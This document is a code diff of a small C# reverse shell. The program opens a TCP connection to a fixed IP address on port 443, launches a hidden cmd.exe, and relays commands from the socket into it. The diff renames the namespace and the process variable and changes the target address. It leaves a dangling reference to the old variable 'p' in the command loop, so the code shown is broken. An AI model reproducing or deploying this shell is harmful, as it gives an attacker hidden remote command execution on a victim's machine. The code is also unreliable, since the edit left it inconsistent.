@@ -8,7 +8,7 @@ using System.Net;
 using System.Net.Sockets;
 
 
-namespace ConnectBack
+namespace deadBack
 {
 	public class Program
 	{
@@ -16,31 +16,28 @@ namespace ConnectBack
 
 		public static void Main(string[] args)
 		{
-			using(TcpClient client = new TcpClient("10.0.2.15", 443))
+			using(TcpClient client = new TcpClient("10.0.0.0", 443))
 			{
 				using(Stream stream = client.GetStream())
 				{
 					using(StreamReader rdr = new StreamReader(stream))
 					{
 						streamWriter = new StreamWriter(stream);
-						
 						StringBuilder strInput = new StringBuilder();
-
-						Process p = new Process();
-						p.StartInfo.FileName = "cmd.exe";
-						p.StartInfo.CreateNoWindow = true;
-						p.StartInfo.UseShellExecute = false;
-						p.StartInfo.RedirectStandardOutput = true;
-						p.StartInfo.RedirectStandardInput = true;
-						p.StartInfo.RedirectStandardError = true;
-						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-						p.Start();
-						p.BeginOutputReadLine();
+						Process deadProc = new Process();
+						deadProc.StartInfo.FileName = "cmd.exe";
+						deadProc.StartInfo.CreateNoWindow = true;
+						deadProc.StartInfo.UseShellExecute = false;
+						deadProc.StartInfo.RedirectStandardOutput = true;
+						deadProc.StartInfo.RedirectStandardInput = true;
+						deadProc.StartInfo.RedirectStandardError = true;
+						deadProc.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						deadProc.Start();
+						deadProc.BeginOutputReadLine();
 
 						while(true)
 						{
 							strInput.Append(rdr.ReadLine());
-							//strInput.Append("\n");
 							p.StandardInput.WriteLine(strInput);
 							strInput.Remove(0, strInput.Length);
 						}
